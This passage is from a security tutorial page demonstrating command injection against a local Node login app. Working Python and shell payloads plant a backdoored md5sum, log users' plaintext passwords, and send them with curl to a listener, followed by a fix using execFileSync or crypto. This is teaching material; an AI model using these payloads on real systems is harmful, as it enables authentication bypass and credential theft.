+		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Injection URL: </span><span class="si">{url}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">))</span>
+		<span class="k">await</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+<span class="c1"># Execute the attack function:</span>
+<span class="n">start</span> <span class="o">=</span> <span class="n">timer</span><span class="p">()</span>
+<span class="k">await</span> <span class="n">attack</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Time elapsed: </span><span class="si">{time}</span><span class="s1"> seconds&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">=</span><span class="n">timer</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span><span class="p">))</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Injection URL: http://localhost:8081/login/a/%24%28echo%20%22%23%21%2Fbin%2Fsh%0A%0Aread%20pass%3Bif%20test%20%5C%22%5C%24pass%5C%22%20%3D%3D%20%27SuperSecretPassword%27%3B%20then%20echo%20-n%20%5C%22%27%20OR%20true%20LIMIT%201%20--%5C%22%3Belse%20echo%20-n%20%5C%24pass%20%7C%20%2Fusr%2Fbin%2Fmd5sum%3Bfi%22%20%3E%20node_modules%2F.bin%2Fmd5sum%3B%20chmod%20%2Bx%20node_modules%2F.bin%2Fmd5sum%29
+
+
+Time elapsed: 0.11733728599938331 seconds
+</pre></div>
+</div>
+</div>
+</div>
+<p>Now, if we look in <code class="docutils literal notranslate"><span class="pre">./node_modules/.bin/</span></code> on the server, we’ll find a new file <code class="docutils literal notranslate"><span class="pre">md5sum</span></code>, with the following
+malicous script uploaded by the previous code:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>
+
+<span class="nb">read</span> pass<span class="p">;</span><span class="k">if</span> <span class="nb">test</span> <span class="s2">&quot;</span><span class="nv">$pass</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s1">&#39;SuperSecretPassword&#39;</span><span class="p">;</span> <span class="k">then</span> <span class="nb">echo</span> -n <span class="s2">&quot;&#39; OR true LIMIT 1 --&quot;</span><span class="p">;</span><span class="k">else</span> <span class="nb">echo</span> -n <span class="nv">$pass</span> <span class="p">|</span> /usr/bin/md5sum<span class="p">;</span><span class="k">fi</span>
+</pre></div>
+</div>
+<p>In a nutshell, this script simply forwards all calls it receives to the real <code class="docutils literal notranslate"><span class="pre">md5sum</span></code> program,
+unless it is provided with <em>SuperSecretPassword</em>, in which case it outputs a <em>SQL Injection</em> string designed
+to force the application to accept that user’s login credentials.
+This essentially turns the phrase <em>SuperSecretPassword</em> into a master-password, which will work on any account
+in the application.</p>
+<p>Let’s give it a try:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># Set the main application variables:</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;localhost:8081&#39;</span>
+
+<span class="c1"># Prepare the HTTP session:</span>
+<span class="k">async</span> <span class="k">with</span> <span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="k">await</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://</span><span class="si">{host}</span><span class="s1">/login/admin/SuperSecretPassword&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">))</span>
+	<span class="nb">print</span><span class="p">(</span><span class="k">await</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">())</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="k">await</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://</span><span class="si">{host}</span><span class="s1">/secret&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">))</span>
+	<span class="nb">print</span><span class="p">(</span><span class="k">await</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">())</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Authentication succeeded!
+The secret word is &quot;xylophone&quot;
+</pre></div>
+</div>
+</div>
+</div>
+<p>With the injected dependency in place, we were successfully able to use our hacked-in master password to bypass the
+password on the <em>admin</em> account, and gain access to the application’s secret information.</p>
+</div>
+<div class="section" id="stealing-other-users-passwords">
+<h2>Stealing Other Users’ Passwords<a class="headerlink" href="#stealing-other-users-passwords" title="Permalink to this headline">¶</a></h2>
+<p>Setting a master-password on the system is one thing, but what if instead of using our injected <code class="docutils literal notranslate"><span class="pre">md5sum</span></code> script
+to bypass authentication, we instead use it to passively record the passwords of all users who try to login to
+the system.
+We could store the plain-text passwords in some log file, which could be retrieved later through
+another <code class="docutils literal notranslate"><span class="pre">curl</span></code> command:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>
+
+<span class="nb">read</span> pass<span class="p">;</span><span class="nb">echo</span> <span class="nv">$pass</span> &gt;&gt; pwd.txt<span class="p">;</span><span class="nb">echo</span> -n <span class="nv">$pass</span> <span class="p">|</span> /usr/bin/md5sum
+</pre></div>
+</div>
+<p>Let’s inject this script into the server just like we did in the previous example:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># Set the main application variables:</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;localhost:8081&#39;</span>
+
+<span class="c1"># Define an async wrapper function to run the attack:</span>
+<span class="k">async</span> <span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
+	<span class="c1"># Prepare the HTTP session:</span>
+	<span class="k">async</span> <span class="k">with</span> <span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+		<span class="c1"># Construct &amp; send a Command-Injection attack to obtain the database credentials:</span>
+		<span class="n">injection</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s1">&#39;$(echo &quot;&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;#!/bin/sh</span><span class="se">\n</span><span class="s1">&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;read pass;&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;echo </span><span class="se">\\</span><span class="s1">$pass &gt;&gt; pwd.txt;&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;echo -n </span><span class="se">\\</span><span class="s1">$pass | /usr/bin/md5sum&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;&quot; &gt; node_modules/.bin/md5sum; chmod +x node_modules/.bin/md5sum)&#39;</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+		<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://</span><span class="si">{host}</span><span class="s1">/login/a/</span><span class="si">{password}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">injection</span><span class="p">)</span>
+		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Injection URL: </span><span class="si">{url}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">))</span>
+		<span class="k">await</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+<span class="c1"># Execute the attack function:</span>
+<span class="n">start</span> <span class="o">=</span> <span class="n">timer</span><span class="p">()</span>
+<span class="k">await</span> <span class="n">attack</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Time elapsed: </span><span class="si">{time}</span><span class="s1"> seconds&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">=</span><span class="n">timer</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span><span class="p">))</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Injection URL: http://localhost:8081/login/a/%24%28echo%20%22%23%21%2Fbin%2Fsh%0A%0Aread%20pass%3Becho%20%5C%24pass%20%3E%3E%20pwd.txt%3Becho%20-n%20%5C%24pass%20%7C%20%2Fusr%2Fbin%2Fmd5sum%22%20%3E%20node_modules%2F.bin%2Fmd5sum%3B%20chmod%20%2Bx%20node_modules%2F.bin%2Fmd5sum%29
+
+
+Time elapsed: 0.05945712199900299 seconds
+</pre></div>
+</div>
+</div>
+</div>
+<p>Although the results of our efforts are not immediately appearant, if we wait for a little while,
+we can retrieve our password log using a <code class="docutils literal notranslate"><span class="pre">curl</span></code> command similar to the one we used to extract the database
+credentials:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>curl -X POST --data-binary pwd.txt http://127.0.0.1:5000
+</pre></div>
+</div>
+<p>Let’s inject that into another subshell using our python client:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># Set the main application variables:</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;localhost:8081&#39;</span>
+<span class="n">localhost</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;pwd.txt&#39;</span>
+
+<span class="c1"># Define a function to serve incoming web requests:</span>
+<span class="k">async</span> <span class="k">def</span> <span class="nf">serve_requests</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+	<span class="c1"># Extract the data from the request:</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="k">await</span> <span class="n">request</span><span class="o">.</span><span class="n">text</span><span class="p">()</span>
+
+	<span class="c1"># Print out the results of the attack:</span>
+	<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;----- BEGIN RECEIVED MESSAGE -----&#39;</span><span class="p">)</span>
+	<span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+	<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;----- END RECEIVED MESSAGE -----&#39;</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">web</span><span class="o">.</span><span class="n">Response</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s2">&quot;Ok&quot;</span><span class="p">)</span>
+
+<span class="c1"># Define an async wrapper function to run the attack:</span>
+<span class="k">async</span> <span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
+	<span class="c1"># Start the HTTP server:</span>
+	<span class="n">app</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">Application</span><span class="p">()</span>
+	<span class="n">app</span><span class="o">.</span><span class="n">add_routes</span><span class="p">([</span><span class="n">web</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">serve_requests</span><span class="p">)])</span>
+	<span class="n">runner</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">AppRunner</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+	<span class="k">await</span> <span class="n">runner</span><span class="o">.</span><span class="n">setup</span><span class="p">()</span>
+	<span class="n">server</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">TCPSite</span><span class="p">(</span><span class="n">runner</span><span class="p">,</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">5000</span><span class="p">)</span>
+	<span class="k">await</span> <span class="n">server</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+	<span class="c1"># Prepare the HTTP session:</span>
+	<span class="k">async</span> <span class="k">with</span> <span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+		<span class="c1"># Construct &amp; send a Command-Injection attack to obtain the database credentials:</span>
+		<span class="n">injection</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s2">&quot;$(curl -X POST --data-binary @</span><span class="si">{filename}</span><span class="s2"> http://</span><span class="si">{localhost}</span><span class="s2">:5000)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="n">filename</span><span class="p">,</span> <span class="n">localhost</span><span class="o">=</span><span class="n">localhost</span><span class="p">),</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+		<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://</span><span class="si">{host}</span><span class="s1">/login/a/</span><span class="si">{password}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">injection</span><span class="p">)</span>
+		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Injection URL: </span><span class="si">{url}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">))</span>
+		<span class="k">await</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+	<span class="c1"># Shutdown the server following the attack:</span>
+	<span class="k">await</span> <span class="n">runner</span><span class="o">.</span><span class="n">cleanup</span><span class="p">()</span>
+
+<span class="c1"># Execute the attack function:</span>
+<span class="n">start</span> <span class="o">=</span> <span class="n">timer</span><span class="p">()</span>
+<span class="k">await</span> <span class="n">attack</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Time elapsed: </span><span class="si">{time}</span><span class="s1"> seconds&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">=</span><span class="n">timer</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span><span class="p">))</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Injection URL: http://localhost:8081/login/a/%24%28curl%20-X%20POST%20--data-binary%20%40pwd.txt%20http%3A%2F%2F127.0.0.1%3A5000%29
+
+----- BEGIN RECEIVED MESSAGE -----
+password123
+paas
+pass
+Ok
+
+----- END RECEIVED MESSAGE -----
+
+Time elapsed: 0.11198758299724432 seconds
+</pre></div>
+</div>
+</div>
+</div>
+<p>As can be seen from the above output, there were 3 attempts to login to the application made by other users
+since we uploaded the logging script, and the passwords each of them attempted are included in the list.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Since we don’t actually have any <em>real</em> users on the platform, I had to simulate the 3 login attempts using
+<code class="docutils literal notranslate"><span class="pre">curl</span></code> commands:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>curl http://localhost:8081/login/admin/password123
+</pre></div>
+</div>
+<p>In the real world, you would just need to wait a little while, until a real user tried to log into the site.</p>
+</div>
+<p>Although this doesn’t give us any usernames to put with the passwords, and the passwords themselves likely
+aren’t all correct, since people tend to mistype those quite a lot,
+this still gives us a relatively short list of passwords we can use to guess each individual account password.</p>
+</div>
+<div class="section" id="avoiding-command-injection">
+<h2>Avoiding Command Injection<a class="headerlink" href="#avoiding-command-injection" title="Permalink to this headline">¶</a></h2>
+<p>Again, the solution here is to read the documentation on
+<a class="reference external" href="https://nodejs.org/api/child_process.html">subprocess management in Node</a>, and use what we learn to eliminate
+the concatenation of sensative command strings with untrusted, user-supplied data.</p>
+<p>One way to do this is by replacing <code class="docutils literal notranslate"><span class="pre">exec</span></code> with <code class="docutils literal notranslate"><span class="pre">execFileSync</span></code>, another function from the same package,
+which can be imported as follows:</p>
+<div class="highlight-js notranslate"><div class="highlight"><pre><span></span><span class="kd">const</span> <span class="p">{</span> <span class="nx">execFileSync</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">);</span>
+</pre></div>
+</div>
+<p>From there, we just need to replace the <code class="docutils literal notranslate"><span class="pre">exec</span></code> call with the following:</p>
+<div class="highlight-js notranslate"><div class="highlight"><pre><span></span><span class="kd">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="nx">execFileSync</span><span class="p">(</span><span class="s1">&#39;md5sum&#39;</span><span class="p">,</span> <span class="p">[],</span> <span class="p">{</span> <span class="nx">input</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">password</span> <span class="p">}).</span><span class="nx">toString</span><span class="p">();</span>
+</pre></div>
+</div>
+<p>Or, better yet, you could just avoid the external system call entirely, preferring the use of safer functions
+from the standard library:</p>
+<div class="highlight-js notranslate"><div class="highlight"><pre><span></span><span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">hash</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">password</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+</pre></div>
+</div>
+<p>And now, with the user’s input appropriately seperated from the <code class="docutils literal notranslate"><span class="pre">'md5sum'</span></code> directive,
+our application is no longer vulnerable to <em>Command Injection</em>.
+It is, however, still an incredibly insecure application.</p>
+</div>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            kernelName: "python3",
+            path: "./appendix/cyber-security"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+              </div>
+              
+        
+            <!-- Previous / next buttons -->
+<div class='prev-next-area'>
+</div>
+        
+        </div>
+    </div>
+    <footer class="footer">
+    <div class="container">
+      <p>
+        
+          By Buckley Ross<br/>
+        
+            &copy; Copyright 2021.<br/>
+          <div class="extra_footer">
+            <center>
+Permission is granted to copy, distribute and/or modify this<br/>
+document under the terms of the GNU Free Documentation License,<br/>
+Version 1.3 or any later version published by the Free Software<br/>
+Foundation; with no Invariant Sections, no Front-Cover Texts, and<br/>
+no Back-Cover Texts.  A copy of the license is included in the<br/>
+section entitled "GNU Free Documentation License".
+</center>
+
+          </div>
+      </p>
+    </div>
+  </footer>
+</main>
+
+
+      </div>
+    </div>
+  
+  <script src="../../_static/js/index.be7d3bbb2ef33a8344ce.js"></script>
+
+  </body>
+</html>
